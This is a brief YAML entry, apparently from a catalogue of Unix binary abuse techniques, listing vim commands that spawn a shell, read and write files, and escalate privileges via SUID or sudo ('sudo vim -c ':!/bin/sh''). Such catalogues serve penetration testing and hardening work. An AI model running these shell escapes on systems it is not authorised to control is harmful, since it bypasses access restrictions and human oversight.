---
functions:
  execute-interactive:
    - code: vim -c ':!/bin/sh'
    - code: |
        vim
        :set shell=/bin/sh
        :shell
  file-write:
    - code: |
        vim file_to_write
        w
  file-read:
    - code: vim file_to_read
  suid-enabled:
    - code: ./vim -c ':!/bin/sh -p'
  sudo-enabled:
    - code: sudo vim -c ':!/bin/sh'
---
